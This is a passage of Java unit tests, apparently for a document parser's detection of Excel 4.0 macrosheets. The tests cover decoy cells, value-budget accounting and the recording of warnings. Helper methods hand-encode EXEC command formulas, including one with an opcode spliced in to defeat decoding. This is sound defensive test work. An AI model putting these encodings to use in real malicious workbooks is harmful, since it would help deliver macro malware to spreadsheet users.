                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        String formula = onlyFormula(parser);
        assertTrue(formula.contains(PAYLOAD),
                "the payload must not be deleted by a later decoy at the same ref; got: "
                        + formula);
        assertTrue(formula.contains("1+1"), "and the decoy is kept too; got: " + formula);
        assertTrue(parser.hasStructuralAnomaly(),
                "a duplicated cell ref is not something Excel emits");
    }

    /**
     * {@code ValueCharBudget} was charged GROSS on a repeated cell ref while the map kept one
     * copy, so duplicate cells drained the document value budget and starved the split URL/IP
     * fragments the map exists to capture. Same net-vs-gross error as the formula path.
     */
    @Test
    void testValueBudgetChargesNetOnReplacement() {
        XSSFExcelExtractorDecorator.ValueCharBudget budget =
                new XSSFExcelExtractorDecorator.ValueCharBudget(2048);

        assertTrue(budget.tryRetain(1024), "first value fits");
        // Same cell ref overwritten twice more: each replaces 1024 chars, so net stays 1024.
        assertTrue(budget.tryRetain(1024, 1024), "a replacement must be charged NET");
        assertTrue(budget.tryRetain(1024, 1024), "and again -- the map still holds ONE copy");
        // A genuinely NEW entry still consumes budget, and the cap still bites.
        assertTrue(budget.tryRetain(1024), "a new entry consumes the remaining budget");
        assertFalse(budget.tryRetain(1, 0),
                "the cap must still bite once genuinely full -- net accounting must not "
                        + "become no accounting");
    }

    /**
     * {@code markXlmCaptureLimit} returned early once the flag was set, so exactly ONE reason was
     * ever recorded -- and an attacker picks which fires first, hiding a severe diagnosis behind
     * a cheap one. The flag is idempotent; the warnings accumulate.
     */
    @Test
    void testDistinctCaptureWarningsAllReachMetadata() throws Exception {
        Metadata metadata = new Metadata();
        // TWO unparseable parts, so BOTH warnings come from markXlmCaptureLimit itself. An
        // earlier version of this test paired a parse error with a structural anomaly -- but the
        // anomaly is published by a DIFFERENT method that always adds, so the assertion passed
        // whether or not markXlmCaptureLimit accumulated. Mutation caught that.
        processMacroSheets(metadata, new String[] {"aa-broken", "bb-alsobroken"},
                new String[] {"   not xml at all", "<worksheet><sheetData><c"});

        String[] warnings = metadata.getValues(TikaCoreProperties.TIKA_META_EXCEPTION_WARNING);
        long parseErrors = java.util.Arrays.stream(warnings)
                .filter(w -> w.contains("parse error")).count();
        assertEquals(2, parseErrors,
                "BOTH parts' parse errors must be recorded -- keeping only the first lets an "
                        + "attacker choose which diagnosis an analyst sees. Got: "
                        + java.util.Arrays.toString(warnings));
        assertTrue(java.util.Arrays.stream(warnings).anyMatch(w -> w.contains("aa-broken"))
                        && java.util.Arrays.stream(warnings).anyMatch(w -> w.contains("bb-")),
                "each warning must name its own part; got: "
                        + java.util.Arrays.toString(warnings));
    }

    // ── helpers ─────────────────────────────────────────────────────────────

    private static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        for (int i = 0; i < 3; i++) {
            rt.gc();
        }
        return rt.totalMemory() - rt.freeMemory();
    }

    private static Biff12XlmFormulaDecoder.EvalContext newCtx() {
        return new Biff12XlmFormulaDecoder.EvalContext(new HashMap<>(), new HashMap<>());
    }

    /** PtgFuncVar(argc=0, NOW=0x004A). */
    private static byte[] nowFormula() {
        return ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x22).put((byte) 0).putShort((short) 0x004A).array();
    }

    private static Object evalNow() {
        return Biff12XlmFormulaDecoder.evaluateFormula(nowFormula(), newCtx());
    }


    private static String onlyFormula(XlmXmlMacrosheetParser parser) {
        return parser.getFormulaList().stream().findFirst().orElse("");
    }

    private static String cellXmlDoc(String cellChildren, String cellType) {
        return String.format(Locale.ROOT, """
                <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
                  <sheetData><row r="1"><c r="A1"%s>%s</c></row></sheetData>
                </worksheet>
                """, cellType == null ? "" : " t=\"" + cellType + "\"", cellChildren);
    }

    private static XlmXmlMacrosheetParser parseCellXml(String cellChildren) throws Exception {
        return parseCellXml(cellChildren, null);
    }

    private static XlmXmlMacrosheetParser parseCellXml(String cellChildren, String cellType)
            throws Exception {
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(
                        cellXmlDoc(cellChildren, cellType).getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();
        return parser;
    }

    /** Run the real multi-part macrosheet loop over the given parts, in name order. */
    private static String processMacroSheets(Metadata metadata, String[] names, String[] xml)
            throws Exception {
        ParseContext parseContext = new ParseContext();
        ToXMLContentHandler output = new ToXMLContentHandler();
        XHTMLContentHandler xhtml =
                new XHTMLContentHandler(output, metadata, parseContext);
        try (ByteArrayOutputStream packageBytes = new ByteArrayOutputStream();
             OPCPackage opcPackage = OPCPackage.create(packageBytes)) {
            for (int i = 0; i < names.length; i++) {
                PackagePart part = opcPackage.createPart(
                        PackagingURIHelper.createPartName(
                                "/xl/macrosheets/" + names[i] + ".xml"),
                        XSSFRelation.MACRO_SHEET_XML.getContentType());
                try (OutputStream stream = part.getOutputStream()) {
                    stream.write(xml[i].getBytes(StandardCharsets.UTF_8));
                }
            }
            XSSFExcelExtractorDecorator decorator =
                    new XSSFExcelExtractorDecorator(parseContext, opcPackage, Locale.ROOT);
            decorator.metadata = metadata;
            Method process = XSSFExcelExtractorDecorator.class.getDeclaredMethod(
                    "processXlmXmlMacroSheets", OPCPackage.class,
                    XHTMLContentHandler.class, XSSFSharedStringsShim.class);
            process.setAccessible(true);

            xhtml.startDocument();
            process.invoke(decorator, opcPackage, xhtml, null);
            xhtml.endDocument();
        }
        return output.toString();
    }

    /** PtgStr(command) + PtgFuncVar(argc=1, EXEC). Mirrors XlmCaptureBoundsTest. */
    private static byte[] execFormula(String command) {
        byte[] commandBytes = command.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(1 + 2 + commandBytes.length + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x17)
                .putShort((short) command.length())
                .put(commandBytes)
                .put((byte) 0x22)
                .put((byte) 1)
                .putShort((short) 0x006e)
                .array();
    }

    /**
     * Same, with one UNKNOWN opcode byte spliced in front of the PtgFuncVar. 0x30 is not in
     * the decoder's handled set, and being unknown its operand length is unknown, so the
     * cursor cannot be advanced past it.
     */
    private static byte[] execFormulaWithUnknownPtgSpliced(String command) {
        byte[] commandBytes = command.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(1 + 2 + commandBytes.length + 1 + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x17)
                .putShort((short) command.length())
                .put(commandBytes)
                .put((byte) 0x30)
                .put((byte) 0x22)
                .put((byte) 1)
                .putShort((short) 0x006e)
                .array();
    }
}
